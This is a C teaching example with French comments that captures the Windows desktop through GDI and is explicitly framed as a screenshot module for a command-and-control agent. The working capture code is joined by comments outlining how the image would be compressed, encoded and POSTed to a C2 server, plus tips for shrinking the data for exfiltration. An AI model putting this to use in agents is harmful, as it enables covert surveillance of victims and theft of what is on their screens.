/*
 * OBJECTIF  : Capture d'ecran avec GDI pour un agent C2
 * PREREQUIS : GDI basics, Bitmap, CreateCompatibleDC
 * COMPILE   : cl example.c /Fe:example.exe /link gdi32.lib user32.lib
 *
 * La capture d'ecran est une commande classique des agents C2.
 * On utilise l'API GDI pour capturer le bureau et creer un BMP.
 */

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

void demo_screen_info(void) {
    printf("[1] Informations sur l'ecran\n\n");

    /* Resolution principale */
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    printf("    Resolution : %dx%d\n", width, height);

    /* Nombre de moniteurs */
    int monitors = GetSystemMetrics(SM_CMONITORS);
    printf("    Moniteurs  : %d\n", monitors);

    /* Bureau virtuel (multi-ecran) */
    int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    printf("    Virtuel    : %dx%d\n", vw, vh);

    /* Profondeur couleur */
    HDC hdc = GetDC(NULL);
    int bpp = GetDeviceCaps(hdc, BITSPIXEL);
    printf("    Couleurs   : %d bits/pixel\n", bpp);
    ReleaseDC(NULL, hdc);
    printf("\n");
}

void demo_screenshot_capture(void) {
    printf("[2] Capture d'ecran GDI\n\n");

    /* Obtenir le DC du bureau */
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) {
        printf("    [-] GetDC echoue\n\n");
        return;
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    /* Creer un DC compatible et un bitmap */
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);

    /* Copier l'ecran dans le bitmap */
    BOOL ok = BitBlt(hdcMem, 0, 0, width, height,
                     hdcScreen, 0, 0, SRCCOPY);
    printf("    [+] BitBlt: %s (%dx%d)\n", ok ? "OK" : "ECHEC", width, height);

    /* Extraire les infos du bitmap */
    BITMAP bmp;
    GetObject(hBitmap, sizeof(bmp), &bmp);
    printf("    [+] Bitmap: %ldx%ld, %d bpp\n",
           bmp.bmWidth, bmp.bmHeight, bmp.bmBitsPixel);

    /* Calculer la taille des donnees */
    DWORD bmpSize = ((width * bmp.bmBitsPixel + 31) / 32) * 4 * height;
    printf("    [+] Taille raw: %lu bytes (%.1f MB)\n",
           bmpSize, bmpSize / (1024.0 * 1024.0));

    /* Preparer le header BMP */
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = width;
    bi.biHeight = height;
    bi.biPlanes = 1;
    bi.biBitCount = bmp.bmBitsPixel;
    bi.biCompression = BI_RGB;

    /* Allouer le buffer et recuperer les pixels */
    BYTE* pixels = (BYTE*)malloc(bmpSize);
    if (pixels) {
        GetDIBits(hdcMem, hBitmap, 0, height, pixels,
                  (BITMAPINFO*)&bi, DIB_RGB_COLORS);

        /* Verifier que les donnees ne sont pas toutes noires */
        DWORD nonZero = 0;
        DWORD i;
        for (i = 0; i < bmpSize && i < 10000; i++)
            if (pixels[i] != 0) nonZero++;
        printf("    [+] Echantillon: %lu/%lu octets non-nuls\n",
               nonZero, i < bmpSize ? i : bmpSize);

        /* Dans un vrai agent, on enverrait les donnees au C2 :
         * 1. Construire le fichier BMP (header + pixels)
         * 2. Compresser (zlib ou similaire)
         * 3. Base64 encoder ou envoyer en binaire
         * 4. POST au serveur C2 */

        free(pixels);
        printf("    [+] Donnees capturees (non sauvegardees - demo)\n");
    }

    /* Nettoyage GDI */
    SelectObject(hdcMem, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    printf("\n");
}

void demo_bmp_format(void) {
    printf("[3] Format BMP pour exfiltration\n\n");
    printf("    Structure d'un fichier BMP :\n");
    printf("    +---------------------------+\n");
    printf("    | BITMAPFILEHEADER (14 B)   |\n");
    printf("    |   'BM' + taille + offset  |\n");
    printf("    +---------------------------+\n");
    printf("    | BITMAPINFOHEADER (40 B)   |\n");
    printf("    |   dimensions, bpp, etc.   |\n");
    printf("    +---------------------------+\n");
    printf("    | Pixel data (variable)     |\n");
    printf("    |   BGR, bottom-up          |\n");
    printf("    +---------------------------+\n\n");

    /* Calculer les tailles pour differentes resolutions */
    printf("    Tailles estimees (24 bpp, non compresse) :\n");
    struct { int w; int h; } resolutions[] = {
        {1920, 1080}, {2560, 1440}, {3840, 2160}
    };
    int i;
    for (i = 0; i < 3; i++) {
        DWORD size = resolutions[i].w * resolutions[i].h * 3;
        printf("    %dx%d : %.1f MB\n",
               resolutions[i].w, resolutions[i].h,
               size / (1024.0 * 1024.0));
    }
    printf("\n    Optimisations pour le C2 :\n");
    printf("    - Compression zlib : ~5-10x reduction\n");
    printf("    - JPEG lossy : ~20-50x reduction\n");
    printf("    - Capturer une sous-region si necessaire\n");
    printf("    - Reduire la resolution avant envoi\n\n");
}

int main(void) {
    printf("[*] Demo : Screenshot pour Agent C2\n");
    printf("[*] ==========================================\n\n");
    demo_screen_info();
    demo_screenshot_capture();
    demo_bmp_format();
    printf("[+] Exemple termine avec succes\n");
    return 0;
}
